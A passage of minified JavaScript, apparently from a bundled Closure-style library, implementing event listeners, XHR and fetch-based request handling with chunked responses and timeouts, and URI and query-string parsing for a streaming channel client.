c=Ct;c.j(a),100>c.h&&(c.h++,a.next=c.g,c.g=a)}$=!1};function J(){this.s=this.s,this.C=this.C}J.prototype.s=!1,J.prototype.ma=function(){this.s||(this.s=!0,this.N())},J.prototype.N=function(){if(this.C)for(;this.C.length;)this.C.shift()()};function ie(a,c){this.type=a,this.g=this.target=c,this.defaultPrevented=!1}ie.prototype.h=function(){this.defaultPrevented=!0};var nn=function(){if(!l.addEventListener||!Object.defineProperty)return!1;var a=!1,c=Object.defineProperty({},"passive",{get:function(){a=!0}});try{const d=()=>{};l.addEventListener("test",d,c),l.removeEventListener("test",d,c)}catch{}return a}();function rn(a,c){if(ie.call(this,a?a.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,a){var d=this.type=a.type,m=a.changedTouches&&a.changedTouches.length?a.changedTouches[0]:null;if(this.target=a.target||a.srcElement,this.g=c,c=a.relatedTarget){if(U){e:{try{V(c.nodeName);var D=!0;break e}catch{}D=!1}D||(c=null)}}else d=="mouseover"?c=a.fromElement:d=="mouseout"&&(c=a.toElement);this.relatedTarget=c,m?(this.clientX=m.clientX!==void 0?m.clientX:m.pageX,this.clientY=m.clientY!==void 0?m.clientY:m.pageY,this.screenX=m.screenX||0,this.screenY=m.screenY||0):(this.clientX=a.clientX!==void 0?a.clientX:a.pageX,this.clientY=a.clientY!==void 0?a.clientY:a.pageY,this.screenX=a.screenX||0,this.screenY=a.screenY||0),this.button=a.button,this.key=a.key||"",this.ctrlKey=a.ctrlKey,this.altKey=a.altKey,this.shiftKey=a.shiftKey,this.metaKey=a.metaKey,this.pointerId=a.pointerId||0,this.pointerType=typeof a.pointerType=="string"?a.pointerType:sn[a.pointerType]||"",this.state=a.state,this.i=a,a.defaultPrevented&&rn.aa.h.call(this)}}A(rn,ie);var sn={2:"touch",3:"pen",4:"mouse"};rn.prototype.h=function(){rn.aa.h.call(this);var a=this.i;a.preventDefault?a.preventDefault():a.returnValue=!1};var on="closure_listenable_"+(1e6*Math.random()|0),Jw=0;function Zw(a,c,d,m,D){this.listener=a,this.proxy=null,this.src=c,this.type=d,this.capture=!!m,this.ha=D,this.key=++Jw,this.da=this.fa=!1}function Oo(a){a.da=!0,a.listener=null,a.proxy=null,a.src=null,a.ha=null}function Lo(a){this.src=a,this.g={},this.h=0}Lo.prototype.add=function(a,c,d,m,D){var b=a.toString();a=this.g[b],a||(a=this.g[b]=[],this.h++);var z=fu(a,c,m,D);return-1<z?(c=a[z],d||(c.fa=!1)):(c=new Zw(c,this.src,b,!!m,D),c.fa=d,a.push(c)),c};function du(a,c){var d=c.type;if(d in a.g){var m=a.g[d],D=Array.prototype.indexOf.call(m,c,void 0),b;(b=0<=D)&&Array.prototype.splice.call(m,D,1),b&&(Oo(c),a.g[d].length==0&&(delete a.g[d],a.h--))}}function fu(a,c,d,m){for(var D=0;D<a.length;++D){var b=a[D];if(!b.da&&b.listener==c&&b.capture==!!d&&b.ha==m)return D}return-1}var pu="closure_lm_"+(1e6*Math.random()|0),mu={};function Df(a,c,d,m,D){if(Array.isArray(c)){for(var b=0;b<c.length;b++)Df(a,c[b],d,m,D);return null}return d=Of(d),a&&a[on]?a.K(c,d,h(m)?!!m.capture:!1,D):eE(a,c,d,!1,m,D)}function eE(a,c,d,m,D,b){if(!c)throw Error("Invalid event type");var z=h(D)?!!D.capture:!!D,de=yu(a);if(de||(a[pu]=de=new Lo(a)),d=de.add(c,d,m,z,b),d.proxy)return d;if(m=tE(),d.proxy=m,m.src=a,m.listener=d,a.addEventListener)nn||(D=z),D===void 0&&(D=!1),a.addEventListener(c.toString(),m,D);else if(a.attachEvent)a.attachEvent(Vf(c.toString()),m);else if(a.addListener&&a.removeListener)a.addListener(m);else throw Error("addEventListener and attachEvent are unavailable.");return d}function tE(){function a(d){return c.call(a.src,a.listener,d)}const c=nE;return a}function bf(a,c,d,m,D){if(Array.isArray(c))for(var b=0;b<c.length;b++)bf(a,c[b],d,m,D);else m=h(m)?!!m.capture:!!m,d=Of(d),a&&a[on]?(a=a.i,c=String(c).toString(),c in a.g&&(b=a.g[c],d=fu(b,d,m,D),-1<d&&(Oo(b[d]),Array.prototype.splice.call(b,d,1),b.length==0&&(delete a.g[c],a.h--)))):a&&(a=yu(a))&&(c=a.g[c.toString()],a=-1,c&&(a=fu(c,d,m,D)),(d=-1<a?c[a]:null)&&gu(d))}function gu(a){if(typeof a!="number"&&a&&!a.da){var c=a.src;if(c&&c[on])du(c.i,a);else{var d=a.type,m=a.proxy;c.removeEventListener?c.removeEventListener(d,m,a.capture):c.detachEvent?c.detachEvent(Vf(d),m):c.addListener&&c.removeListener&&c.removeListener(m),(d=yu(c))?(du(d,a),d.h==0&&(d.src=null,c[pu]=null)):Oo(a)}}}function Vf(a){return a in mu?mu[a]:mu[a]="on"+a}function nE(a,c){if(a.da)a=!0;else{c=new rn(c,this);var d=a.listener,m=a.ha||a.src;a.fa&&gu(a),a=d.call(m,c)}return a}function yu(a){return a=a[pu],a instanceof Lo?a:null}var vu="__closure_events_fn_"+(1e9*Math.random()>>>0);function Of(a){return typeof a=="function"?a:(a[vu]||(a[vu]=function(c){return a.handleEvent(c)}),a[vu])}function qe(){J.call(this),this.i=new Lo(this),this.M=this,this.F=null}A(qe,J),qe.prototype[on]=!0,qe.prototype.removeEventListener=function(a,c,d,m){bf(this,a,c,d,m)};function nt(a,c){var d,m=a.F;if(m)for(d=[];m;m=m.F)d.push(m);if(a=a.M,m=c.type||c,typeof c=="string")c=new ie(c,a);else if(c instanceof ie)c.target=c.target||a;else{var D=c;c=new ie(m,a),C(c,D)}if(D=!0,d)for(var b=d.length-1;0<=b;b--){var z=c.g=d[b];D=Mo(z,m,!0,c)&&D}if(z=c.g=a,D=Mo(z,m,!0,c)&&D,D=Mo(z,m,!1,c)&&D,d)for(b=0;b<d.length;b++)z=c.g=d[b],D=Mo(z,m,!1,c)&&D}qe.prototype.N=function(){if(qe.aa.N.call(this),this.i){var a=this.i,c;for(c in a.g){for(var d=a.g[c],m=0;m<d.length;m++)Oo(d[m]);delete a.g[c],a.h--}}this.F=null},qe.prototype.K=function(a,c,d,m){return this.i.add(String(a),c,!1,d,m)},qe.prototype.L=function(a,c,d,m){return this.i.add(String(a),c,!0,d,m)};function Mo(a,c,d,m){if(c=a.i.g[String(c)],!c)return!0;c=c.concat();for(var D=!0,b=0;b<c.length;++b){var z=c[b];if(z&&!z.da&&z.capture==d){var de=z.listener,Me=z.ha||z.src;z.fa&&du(a.i,z),D=de.call(Me,m)!==!1&&D}}return D&&!m.defaultPrevented}function Lf(a,c,d){if(typeof a=="function")d&&(a=g(a,d));else if(a&&typeof a.handleEvent=="function")a=g(a.handleEvent,a);else throw Error("Invalid listener argument");return 2147483647<Number(c)?-1:l.setTimeout(a,c||0)}function Mf(a){a.g=Lf(()=>{a.g=null,a.i&&(a.i=!1,Mf(a))},a.l);const c=a.h;a.h=null,a.m.apply(null,c)}class rE extends J{constructor(c,d){super(),this.m=c,this.l=d,this.h=null,this.i=!1,this.g=null}j(c){this.h=arguments,this.g?this.i=!0:Mf(this)}N(){super.N(),this.g&&(l.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function Qi(a){J.call(this),this.h=a,this.g={}}A(Qi,J);var Ff=[];function Uf(a){j(a.g,function(c,d){this.g.hasOwnProperty(d)&&gu(c)},a),a.g={}}Qi.prototype.N=function(){Qi.aa.N.call(this),Uf(this)},Qi.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")};var _u=l.JSON.stringify,iE=l.JSON.parse,sE=class{stringify(a){return l.JSON.stringify(a,void 0)}parse(a){return l.JSON.parse(a,void 0)}};function wu(){}wu.prototype.h=null;function jf(a){return a.h||(a.h=a.i())}function zf(){}var Yi={OPEN:"a",kb:"b",Ja:"c",wb:"d"};function Eu(){ie.call(this,"d")}A(Eu,ie);function Tu(){ie.call(this,"c")}A(Tu,ie);var pr={},Bf=null;function Fo(){return Bf=Bf||new qe}pr.La="serverreachability";function $f(a){ie.call(this,pr.La,a)}A($f,ie);function Xi(a){const c=Fo();nt(c,new $f(c))}pr.STAT_EVENT="statevent";function Wf(a,c){ie.call(this,pr.STAT_EVENT,a),this.stat=c}A(Wf,ie);function rt(a){const c=Fo();nt(c,new Wf(c,a))}pr.Ma="timingevent";function qf(a,c){ie.call(this,pr.Ma,a),this.size=c}A(qf,ie);function Ji(a,c){if(typeof a!="function")throw Error("Fn must not be null and must be a function");return l.setTimeout(function(){a()},c)}function Zi(){this.g=!0}Zi.prototype.xa=function(){this.g=!1};function oE(a,c,d,m,D,b){a.info(function(){if(a.g)if(b)for(var z="",de=b.split("&"),Me=0;Me<de.length;Me++){var ae=de[Me].split("=");if(1<ae.length){var He=ae[0];ae=ae[1];var Ge=He.split("_");z=2<=Ge.length&&Ge[1]=="type"?z+(He+"="+ae+"&"):z+(He+"=redacted&")}}else z=null;else z=b;return"XMLHTTP REQ ("+m+") [attempt "+D+"]: "+c+`
`+d+`
`+z})}function aE(a,c,d,m,D,b,z){a.info(function(){return"XMLHTTP RESP ("+m+") [ attempt "+D+"]: "+c+`
`+d+`
`+b+" "+z})}function Hr(a,c,d,m){a.info(function(){return"XMLHTTP TEXT ("+c+"): "+uE(a,d)+(m?" "+m:"")})}function lE(a,c){a.info(function(){return"TIMEOUT: "+c})}Zi.prototype.info=function(){};function uE(a,c){if(!a.g)return c;if(!c)return null;try{var d=JSON.parse(c);if(d){for(a=0;a<d.length;a++)if(Array.isArray(d[a])){var m=d[a];if(!(2>m.length)){var D=m[1];if(Array.isArray(D)&&!(1>D.length)){var b=D[0];if(b!="noop"&&b!="stop"&&b!="close")for(var z=1;z<D.length;z++)D[z]=""}}}}return _u(d)}catch{return c}}var Uo={NO_ERROR:0,gb:1,tb:2,sb:3,nb:4,rb:5,ub:6,Ia:7,TIMEOUT:8,xb:9},Hf={lb:"complete",Hb:"success",Ja:"error",Ia:"abort",zb:"ready",Ab:"readystatechange",TIMEOUT:"timeout",vb:"incrementaldata",yb:"progress",ob:"downloadprogress",Pb:"uploadprogress"},Iu;function jo(){}A(jo,wu),jo.prototype.g=function(){return new XMLHttpRequest},jo.prototype.i=function(){return{}},Iu=new jo;function kn(a,c,d,m){this.j=a,this.i=c,this.l=d,this.R=m||1,this.U=new Qi(this),this.I=45e3,this.H=null,this.o=!1,this.m=this.A=this.v=this.L=this.F=this.S=this.B=null,this.D=[],this.g=null,this.C=0,this.s=this.u=null,this.X=-1,this.J=!1,this.O=0,this.M=null,this.W=this.K=this.T=this.P=!1,this.h=new Gf}function Gf(){this.i=null,this.g="",this.h=!1}var Kf={},Su={};function Au(a,c,d){a.L=1,a.v=Wo(an(c)),a.m=d,a.P=!0,Qf(a,null)}function Qf(a,c){a.F=Date.now(),zo(a),a.A=an(a.v);var d=a.A,m=a.R;Array.isArray(m)||(m=[String(m)]),up(d.i,"t",m),a.C=0,d=a.j.J,a.h=new Gf,a.g=Rp(a.j,d?c:null,!a.m),0<a.O&&(a.M=new rE(g(a.Y,a,a.g),a.O)),c=a.U,d=a.g,m=a.ca;var D="readystatechange";Array.isArray(D)||(D&&(Ff[0]=D.toString()),D=Ff);for(var b=0;b<D.length;b++){var z=Df(d,D[b],m||c.handleEvent,!1,c.h||c);if(!z)break;c.g[z.key]=z}c=a.H?y(a.H):{},a.m?(a.u||(a.u="POST"),c["Content-Type"]="application/x-www-form-urlencoded",a.g.ea(a.A,a.u,a.m,c)):(a.u="GET",a.g.ea(a.A,a.u,null,c)),Xi(),oE(a.i,a.u,a.A,a.l,a.R,a.m)}kn.prototype.ca=function(a){a=a.target;const c=this.M;c&&ln(a)==3?c.j():this.Y(a)},kn.prototype.Y=function(a){try{if(a==this.g)e:{const Ge=ln(this.g);var c=this.g.Ba();const Qr=this.g.Z();if(!(3>Ge)&&(Ge!=3||this.g&&(this.h.h||this.g.oa()||gp(this.g)))){this.J||Ge!=4||c==7||(c==8||0>=Qr?Xi(3):Xi(2)),Cu(this);var d=this.g.Z();this.X=d;t:if(Yf(this)){var m=gp(this.g);a="";var D=m.length,b=ln(this.g)==4;if(!this.h.i){if(typeof TextDecoder>"u"){mr(this),es(this);var z="";break t}this.h.i=new l.TextDecoder}for(c=0;c<D;c++)this.h.h=!0,a+=this.h.i.decode(m[c],{stream:!(b&&c==D-1)});m.length=0,this.h.g+=a,this.C=0,z=this.h.g}else z=this.g.oa();if(this.o=d==200,aE(this.i,this.u,this.A,this.l,this.R,Ge,d),this.o){if(this.T&&!this.K){t:{if(this.g){var de,Me=this.g;if((de=Me.g?Me.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!_(de)){var ae=de;break t}}ae=null}if(d=ae)Hr(this.i,this.l,d,"Initial handshake response via X-HTTP-Initial-Response"),this.K=!0,Ru(this,d);else{this.o=!1,this.s=3,rt(12),mr(this),es(this);break e}}if(this.P){d=!0;let Ot;for(;!this.J&&this.C<z.length;)if(Ot=cE(this,z),Ot==Su){Ge==4&&(this.s=4,rt(14),d=!1),Hr(this.i,this.l,null,"[Incomplete Response]");break}else if(Ot==Kf){this.s=4,rt(15),Hr(this.i,this.l,z,"[Invalid Chunk]"),d=!1;break}else Hr(this.i,this.l,Ot,null),Ru(this,Ot);if(Yf(this)&&this.C!=0&&(this.h.g=this.h.g.slice(this.C),this.C=0),Ge!=4||z.length!=0||this.h.h||(this.s=1,rt(16),d=!1),this.o=this.o&&d,!d)Hr(this.i,this.l,z,"[Invalid Chunked Response]"),mr(this),es(this);else if(0<z.length&&!this.W){this.W=!0;var He=this.j;He.g==this&&He.ba&&!He.M&&(He.j.info("Great, no buffering proxy detected. Bytes received: "+z.length),bu(He),He.M=!0,rt(11))}}else Hr(this.i,this.l,z,null),Ru(this,z);Ge==4&&mr(this),this.o&&!this.J&&(Ge==4?Ip(this.j,this):(this.o=!1,zo(this)))}else RE(this.g),d==400&&0<z.indexOf("Unknown SID")?(this.s=3,rt(12)):(this.s=0,rt(13)),mr(this),es(this)}}}catch{}finally{}};function Yf(a){return a.g?a.u=="GET"&&a.L!=2&&a.j.Ca:!1}function cE(a,c){var d=a.C,m=c.indexOf(`
`,d);return m==-1?Su:(d=Number(c.substring(d,m)),isNaN(d)?Kf:(m+=1,m+d>c.length?Su:(c=c.slice(m,m+d),a.C=m+d,c)))}kn.prototype.cancel=function(){this.J=!0,mr(this)};function zo(a){a.S=Date.now()+a.I,Xf(a,a.I)}function Xf(a,c){if(a.B!=null)throw Error("WatchDog timer not null");a.B=Ji(g(a.ba,a),c)}function Cu(a){a.B&&(l.clearTimeout(a.B),a.B=null)}kn.prototype.ba=function(){this.B=null;const a=Date.now();0<=a-this.S?(lE(this.i,this.A),this.L!=2&&(Xi(),rt(17)),mr(this),this.s=2,es(this)):Xf(this,this.S-a)};function es(a){a.j.G==0||a.J||Ip(a.j,a)}function mr(a){Cu(a);var c=a.M;c&&typeof c.ma=="function"&&c.ma(),a.M=null,Uf(a.U),a.g&&(c=a.g,a.g=null,c.abort(),c.ma())}function Ru(a,c){try{var d=a.j;if(d.G!=0&&(d.g==a||xu(d.h,a))){if(!a.K&&xu(d.h,a)&&d.G==3){try{var m=d.Da.g.parse(c)}catch{m=null}if(Array.isArray(m)&&m.length==3){var D=m;if(D[0]==0){e:if(!d.u){if(d.g)if(d.g.F+3e3<a.F)Yo(d),Ko(d);else break e;Du(d),rt(18)}}else d.za=D[1],0<d.za-d.T&&37500>D[2]&&d.F&&d.v==0&&!d.C&&(d.C=Ji(g(d.Za,d),6e3));if(1>=ep(d.h)&&d.ca){try{d.ca()}catch{}d.ca=void 0}}else yr(d,11)}else if((a.K||d.g==a)&&Yo(d),!_(c))for(D=d.Da.g.parse(c),c=0;c<D.length;c++){let ae=D[c];if(d.T=ae[0],ae=ae[1],d.G==2)if(ae[0]=="c"){d.K=ae[1],d.ia=ae[2];const He=ae[3];He!=null&&(d.la=He,d.j.info("VER="+d.la));const Ge=ae[4];Ge!=null&&(d.Aa=Ge,d.j.info("SVER="+d.Aa));const Qr=ae[5];Qr!=null&&typeof Qr=="number"&&0<Qr&&(m=1.5*Qr,d.L=m,d.j.info("backChannelRequestTimeoutMs_="+m)),m=d;const Ot=a.g;if(Ot){const Jo=Ot.g?Ot.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(Jo){var b=m.h;b.g||Jo.indexOf("spdy")==-1&&Jo.indexOf("quic")==-1&&Jo.indexOf("h2")==-1||(b.j=b.l,b.g=new Set,b.h&&(ku(b,b.h),b.h=null))}if(m.D){const Vu=Ot.g?Ot.g.getResponseHeader("X-HTTP-Session-Id"):null;Vu&&(m.ya=Vu,me(m.I,m.D,Vu))}}d.G=3,d.l&&d.l.ua(),d.ba&&(d.R=Date.now()-a.F,d.j.info("Handshake RTT: "+d.R+"ms")),m=d;var z=a;if(m.qa=Cp(m,m.J?m.ia:null,m.W),z.K){tp(m.h,z);var de=z,Me=m.L;Me&&(de.I=Me),de.B&&(Cu(de),zo(de)),m.g=z}else Ep(m);0<d.i.length&&Qo(d)}else ae[0]!="stop"&&ae[0]!="close"||yr(d,7);else d.G==3&&(ae[0]=="stop"||ae[0]=="close"?ae[0]=="stop"?yr(d,7):Nu(d):ae[0]!="noop"&&d.l&&d.l.ta(ae),d.v=0)}}Xi(4)}catch{}}var hE=class{constructor(a,c){this.g=a,this.map=c}};function Jf(a){this.l=a||10,l.PerformanceNavigationTiming?(a=l.performance.getEntriesByType("navigation"),a=0<a.length&&(a[0].nextHopProtocol=="hq"||a[0].nextHopProtocol=="h2")):a=!!(l.chrome&&l.chrome.loadTimes&&l.chrome.loadTimes()&&l.chrome.loadTimes().wasFetchedViaSpdy),this.j=a?this.l:1,this.g=null,1<this.j&&(this.g=new Set),this.h=null,this.i=[]}function Zf(a){return a.h?!0:a.g?a.g.size>=a.j:!1}function ep(a){return a.h?1:a.g?a.g.size:0}function xu(a,c){return a.h?a.h==c:a.g?a.g.has(c):!1}function ku(a,c){a.g?a.g.add(c):a.h=c}function tp(a,c){a.h&&a.h==c?a.h=null:a.g&&a.g.has(c)&&a.g.delete(c)}Jf.prototype.cancel=function(){if(this.i=np(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&this.g.size!==0){for(const a of this.g.values())a.cancel();this.g.clear()}};function np(a){if(a.h!=null)return a.i.concat(a.h.D);if(a.g!=null&&a.g.size!==0){let c=a.i;for(const d of a.g.values())c=c.concat(d.D);return c}return k(a.i)}function dE(a){if(a.V&&typeof a.V=="function")return a.V();if(typeof Map<"u"&&a instanceof Map||typeof Set<"u"&&a instanceof Set)return Array.from(a.values());if(typeof a=="string")return a.split("");if(u(a)){for(var c=[],d=a.length,m=0;m<d;m++)c.push(a[m]);return c}c=[],d=0;for(m in a)c[d++]=a[m];return c}function fE(a){if(a.na&&typeof a.na=="function")return a.na();if(!a.V||typeof a.V!="function"){if(typeof Map<"u"&&a instanceof Map)return Array.from(a.keys());if(!(typeof Set<"u"&&a instanceof Set)){if(u(a)||typeof a=="string"){var c=[];a=a.length;for(var d=0;d<a;d++)c.push(d);return c}c=[],d=0;for(const m in a)c[d++]=m;return c}}}function rp(a,c){if(a.forEach&&typeof a.forEach=="function")a.forEach(c,void 0);else if(u(a)||typeof a=="string")Array.prototype.forEach.call(a,c,void 0);else for(var d=fE(a),m=dE(a),D=m.length,b=0;b<D;b++)c.call(void 0,m[b],d&&d[b],a)}var ip=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function pE(a,c){if(a){a=a.split("&");for(var d=0;d<a.length;d++){var m=a[d].indexOf("="),D=null;if(0<=m){var b=a[d].substring(0,m);D=a[d].substring(m+1)}else b=a[d];c(b,D?decodeURIComponent(D.replace(/\+/g," ")):"")}}}function gr(a){if(this.g=this.o=this.j="",this.s=null,this.m=this.l="",this.h=!1,a instanceof gr){this.h=a.h,Bo(this,a.j),this.o=a.o,this.g=a.g,$o(this,a.s),this.l=a.l;var c=a.i,d=new rs;d.i=c.i,c.g&&(d.g=new Map(c.g),d.h=c.h),sp(this,d),this.m=a.m}else a&&(c=String(a).match(ip))?(this.h=!1,Bo(this,c[1]||"",!0),this.o=ts(c[2]||""),this.g=ts(c[3]||"",!0),$o(this,c[4]),this.l=ts(c[5]||"",!0),sp(this,c[6]||"",!0),this.m=ts(c[7]||"")):(this.h=!1,this.i=new rs(null,this.h))}gr.prototype.toString=function(){var a=[],c=this.j;c&&a.push(ns(c,op,!0),":");var d=this.g;return(d||c=="file")&&(a.push("//"),(c=this.o)&&a.push(ns(c,op,!0),"@"),a.push(encodeURIComponent(String(d)).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),d=this.s,d!=null&&a.push(":",String(d))),(d=this.l)&&(this.g&&d.charAt(0)!="/"&&a.push("/"),a.push(ns(d,d.charAt(0)=="/"?yE:gE,!0))),(d=this.i.toString())&&a.push("?",d),(d=this.m)&&a.push("#",ns(d,_E)),a.join("")};function an(a){return new gr(a)}function Bo(a,c,d){a.j=d?ts(c,!0):c,a.j&&(a.j=a.j.replace(/:$/,""))}function $o(a,c){if(c){if(c=Number(c),isNaN(c)||0>c)throw Error("Bad port number "+c);a.s=c}else a.s=null}function sp(a,c,d){c instanceof rs?(a.i=c,wE(a.i,a.h)):(d||(c=ns(c,vE)),a.i=new rs(c,a.h))}function me(a,c,d){a.i.set(c,d)}function Wo(a){return me(a,"zx",Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)),a}function ts(a,c){return a?c?decodeURI(a.replace(/%25/g,"%2525")):decodeURIComponent(a):""}function ns(a,c,d){return typeof a=="string"?(a=encodeURI(a).replace(c,mE),d&&(a=a.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),a):null}function mE(a){return a=a.charCodeAt(0),"%"+(a>>4&15).toString(16)+(a&15).toString(16)}var op=/[#\/\?@]/g,gE=/[#\?:]/g,yE=/[#\?]/g,vE=/[#\?@]/g,_E=/#/g;function rs(a,c){this.h=this.g=null,this.i=a||null,this.j=!!c}function Pn(a){a.g||(a.g=new Map,a.h=0,a.i&&pE(a.i,function(c,d){a.add(decodeURIComponent(c.replace(/\+/g," ")),d)}))}t=rs.prototype,t.add=function(a,c){Pn(this),this.i=null,a=Gr(this,a);var d=this.g.get(a);return d||this.g.set(a,d=[]),d.push(c),this.h+=1,this};function ap(a,c){Pn(a),c=Gr(a,c),a.g.has(c)&&(a.i=null,a.h-=a.g.get(c).length,a.g.delete(c))}function lp(a,c){return Pn(a),c=Gr(a,c),a.g.has(c)}t.forEach=function(a,c){Pn(this),this.g.forEach(function(d,m){d.forEach(function(D){a.call(c,D,m,this)},this)},this)},t.na=function(){Pn(this);const a=Array.from(this.g.values()),c=Array.from(this.g.keys()),d=[];for(let m=0;m<c.length;m++){const D=a[m];for(let b=0;b<D.length;b++)d.push(c[m])}return d},t.V=function(a){Pn(this);let c=[];if(typeof a=="string")lp(this,a)&&(c=c.concat(this.g.get(Gr(this,a))));else{a=Array.from(this.g.values());for(let d=0;d<a.length;d++)c=c.concat(a[d])}return c},t.set=function(a,c){return Pn(this),this.i=null,a=Gr(this,a),lp(this,a)&&(this.h-=this.g.get(a).length),this.g.set(a,[c]),this.h+=1,this},t.get=function(a,c){return a?(a=this.V(a),0<a.length?String(a[0]):c):c};function up(a,c,d){ap(a,c),0<d.length&&(a.i=null,a.g.set(Gr(a,c),k(d)),a.h+=d.length)}t.toString=function(){if(this.i)return this.i;if(!this.g)return"";const a=[],c=Array.from(this.g.keys());for(var d=0;d<c.length;d++){var m=c[d];const b=encodeURIComponent(String(m)),z=this.V(m);for(m=0;m<z.length;m++){var D=b;z[m]!==""&&(D+="="+encodeURIComponent(String(z[m]))),a.push(D)}}return this.i=a.join("&")};function Gr(a,c){return c=String(c),a.j&&(c=c.toLowerCase()),c}function wE(a,c){c&&!a.j&&(Pn(a),a.i=null,a.g.forEach(function(d,m){var D=m.toLowerCase();m!=D&&(ap(this,m),up(this,D,d))},a)),a.j=c}function EE(a,c){const d=new Zi;if(l.Image){const m=new Image;m.onload=v(Nn,d,"TestLoadImage: loaded",!0,c,m),m.onerror=v(Nn,d,"TestLoadImage: error",!1,c,m),m.onabort=v(Nn,d,"TestLoadImage: abort",!1,c,m),m.ontimeout=v(Nn,d,"TestLoadImage: timeout",!1,c,m),l.setTimeout(function(){m.ontimeout&&m.ontimeout()},1e4),m.src=a}else c(!1)}function TE(a,c){const d=new Zi,m=new AbortController,D=setTimeout(()=>{m.abort(),Nn(d,"TestPingServer: timeout",!1,c)},1e4);fetch(a,{signal:m.signal}).then(b=>{clearTimeout(D),b.ok?Nn(d,"TestPingServer: ok",!0,c):Nn(d,"TestPingServer: server error",!1,c)}).catch(()=>{clearTimeout(D),Nn(d,"TestPingServer: error",!1,c)})}function Nn(a,c,d,m,D){try{D&&(D.onload=null,D.onerror=null,D.onabort=null,D.ontimeout=null),m(d)}catch{}}function IE(){this.g=new sE}function SE(a,c,d){const m=d||"";try{rp(a,function(D,b){let z=D;h(D)&&(z=_u(D)),c.push(m+b+"="+encodeURIComponent(z))})}catch(D){throw c.push(m+"type="+encodeURIComponent("_badmap")),D}}function qo(a){this.l=a.Ub||null,this.j=a.eb||!1}A(qo,wu),qo.prototype.g=function(){return new Ho(this.l,this.j)},qo.prototype.i=function(a){return function(){return a}}({});function Ho(a,c){qe.call(this),this.D=a,this.o=c,this.m=void 0,this.status=this.readyState=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.u=new Headers,this.h=null,this.B="GET",this.A="",this.g=!1,this.v=this.j=this.l=null}A(Ho,qe),t=Ho.prototype,t.open=function(a,c){if(this.readyState!=0)throw this.abort(),Error("Error reopening a connection");this.B=a,this.A=c,this.readyState=1,ss(this)},t.send=function(a){if(this.readyState!=1)throw this.abort(),Error("need to call open() first. ");this.g=!0;const c={headers:this.u,method:this.B,credentials:this.m,cache:void 0};a&&(c.body=a),(this.D||l).fetch(new Request(this.A,c)).then(this.Sa.bind(this),this.ga.bind(this))},t.abort=function(){this.response=this.responseText="",this.u=new Headers,this.status=0,this.j&&this.j.cancel("Request was aborted.").catch(()=>{}),1<=this.readyState&&this.g&&this.readyState!=4&&(this.g=!1,is(this)),this.readyState=0},t.Sa=function(a){if(this.g&&(this.l=a,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=a.headers,this.readyState=2,ss(this)),this.g&&(this.readyState=3,ss(this),this.g)))if(this.responseType==="arraybuffer")a.arrayBuffer().then(this.Qa.bind(this),this.ga.bind(this));else if(typeof l.ReadableStream<"u"&&"body"in a){if(this.j=a.body.getReader(),this.o){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.v=new TextDecoder;cp(this)}else a.text().then(this.Ra.bind(this),this.ga.bind(this))};function cp(a){a.j.read().then(a.Pa.bind(a)).catch(a.ga.bind(a))}t.Pa=function(a){if(this.g){if(this.o&&a.value)this.response.push(a.value);else if(!this.o){var c=a.value?a.value:new Uint8Array(0);(c=this.v.decode(c,{stream:!a.done}))&&(this.response=this.responseText+=c)}a.done?is(this):ss(this),this.readyState==3&&cp(this)}},t.Ra=function(a){this.g&&(this.response=this.responseText=a,is(this))},t.Qa=function(a){this.g&&(this.response=a,is(this))},t.ga=function(){this.g&&is(this)};function is(a){a.readyState=4,a.l=null,a.j=null,a.v=null,ss(a)}t.setRequestHeader=function(a,c){this.u.append(a,c)},t.getResponseHeader=function(a){return this.h&&this.h.get(a.toLowerCase())||""},t.getAllResponseHeaders=function(){if(!this.h)return"";const a=[],c=this.h.entries();for(var d=c.next();!d.done;)d=d.value,a.push(d[0]+": "+d[1]),d=c.next();return a.join(`\r
`)};function ss(a){a.onreadystatechange&&a.onreadystatechange.call(a)}Object.defineProperty(Ho.prototype,"withCredentials",{get:function(){return this.m==="include"},set:function(a){this.m=a?"include":"same-origin"}});function hp(a){let c="";return j(a,function(d,m){c+=m,c+=":",c+=d,c+=`\r
`}),c}function Pu(a,c,d){e:{for(m in d){var m=!1;break e}m=!0}m||(d=hp(d),typeof a=="string"?d!=null&&encodeURIComponent(String(d)):me(a,c,d))}function Se(a){qe.call(this),this.headers=new Map,this.o=a||null,this.h=!1,this.v=this.g=null,this.D="",this.m=0,this.l="",this.j=this.B=this.u=this.A=!1,this.I=null,this.H="",this.J=!1}A(Se,qe);var AE=/^https?$/i,CE=["POST","PUT"];t=Se.prototype,t.Ha=function(a){this.J=a},t.ea=function(a,c,d,m){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.D+"; newUri="+a);c=c?c.toUpperCase():"GET",this.D=a,this.l="",this.m=0,this.A=!1,this.h=!0,this.g=this.o?this.o.g():Iu.g(),this.v=this.o?jf(this.o):jf(Iu),this.g.onreadystatechange=g(this.Ea,this);try{this.B=!0,this.g.open(c,String(a),!0),this.B=!1}catch(b){dp(this,b);return}if(a=d||"",d=new Map(this.headers),m)if(Object.getPrototypeOf(m)===Object.prototype)for(var D in m)d.set(D,m[D]);else if(typeof m.keys=="function"&&typeof m.get=="function")for(const b of m.keys())d.set(b,m.get(b));else throw Error("Unknown input type for opt_headers: "+String(m));m=Array.from(d.keys()).find(b=>b.toLowerCase()=="content-type"),D=l.FormData&&a instanceof l.FormData,!(0<=Array.prototype.indexOf.call(CE,c,void 